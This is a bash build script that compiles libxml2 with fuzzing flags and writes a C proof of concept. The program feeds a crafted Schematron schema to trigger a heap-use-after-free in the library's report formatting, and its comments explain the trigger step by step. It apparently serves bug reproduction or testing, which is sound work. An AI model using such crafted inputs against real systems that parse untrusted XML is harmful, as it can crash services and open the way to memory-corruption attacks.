#!/bin/bash
export CFLAGS="-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION $CFLAGS"

./autogen.sh
./configure --prefix=$PWD/install --with-zlib --with-lzma --with-schematron
make -j8
make install

cat <<EOF > poc.c
#include <stdio.h>
#include <string.h>
#include <libxml/parser.h>
#include <libxml/schematron.h>

// PoC to reproduce the heap-use-after-free in libxml2 schematron
int main() {
    const char* schema_xml = 
        "<sch:schema xmlns:sch=\"http://purl.oclc.org/dsdl/schematron\">"
        "<sch:pattern id=\"\">"
        "<sch:rule context=\"boo0\">"
        "<sch:report test=\"not(0)\">"
        "<sch:name path=\"&#9;e|namespace::*|e\"/>"
        "</sch:report>"
        "<sch:report test=\"0\"></sch:report>"
        "</sch:rule>"
        "</sch:pattern>"
        "</sch:schema>";

    // Real instance document from schematron6.txt
    const char* instance_xml = 
        "<librar0>"
        "<boo0 t=\"\">"
        "<author></author>"
        "</boo0>"
        "<ins></ins>"
        "</librar0>";

    xmlInitParser();
    
    // Parse schema
    xmlDocPtr schemaDoc = xmlReadMemory(schema_xml, strlen(schema_xml), "schema.xml", NULL, 
                                       XML_PARSE_NOENT | XML_PARSE_NONET);
    if (!schemaDoc) {
        printf("Failed to parse schema\n");
        return 1;
    }

    // Create schematron parser context
    xmlSchematronParserCtxtPtr parserCtxt = xmlSchematronNewDocParserCtxt(schemaDoc);
    if (!parserCtxt) {
        printf("Failed to create parser context\n");
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    // Parse schematron schema
    xmlSchematronPtr schema = xmlSchematronParse(parserCtxt);
    if (!schema) {
        printf("Failed to parse schematron\n");
        xmlSchematronFreeParserCtxt(parserCtxt);
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    // Parse instance document
    xmlDocPtr instanceDoc = xmlReadMemory(instance_xml, strlen(instance_xml), "instance.xml", NULL,
                                         XML_PARSE_NOENT | XML_PARSE_NONET);
    if (!instanceDoc) {
        printf("Failed to parse instance\n");
        xmlSchematronFree(schema);
        xmlSchematronFreeParserCtxt(parserCtxt);
        xmlFreeDoc(schemaDoc);
        return 1;
    }

    // Create validation context
    xmlSchematronValidCtxtPtr validCtxt = xmlSchematronNewValidCtxt(schema, 0);
    if (!validCtxt) {
        printf("Failed to create validation context\n");
        xmlFreeDoc(instanceDoc);
        xmlSchematronFree(schema);
        xmlSchematronFreeParserCtxt(parserCtxt);
        xmlFreeDoc(schemaDoc);
        return 1;
    }
    
    // This should trigger the heap-use-after-free:
    // 1. Rule context "boo0" matches the <boo0> element
    // 2. test="not(0)" evaluates to true (not(false) = true)
    // 3. Report is triggered and xmlSchematronFormatReport is called
    // 4. Processing <sch:name path="&#9;e|namespace::*|e"/> calls xmlSchematronGetNode
    // 5. The complex XPath creates a nodeset that gets freed immediately
    // 6. Access to returned node->ns causes heap-use-after-free
    int result = xmlSchematronValidateDoc(validCtxt, instanceDoc);
    printf("Validation completed - result: %d\n", result);

    // Cleanup
    xmlSchematronFreeValidCtxt(validCtxt);
    xmlFreeDoc(instanceDoc);
    xmlSchematronFree(schema);
    xmlSchematronFreeParserCtxt(parserCtxt);
    xmlFreeDoc(schemaDoc);
    xmlCleanupParser();

    return 0;
}
EOF

if [ ! -z "${CC:-}" ]; then
    $CC $CFLAGS -I./install/include/libxml2 -L./install/lib -Wl,-rpath=$PWD/install/lib -lxml2 -lz -llzma -lm -o poc poc.c
fi
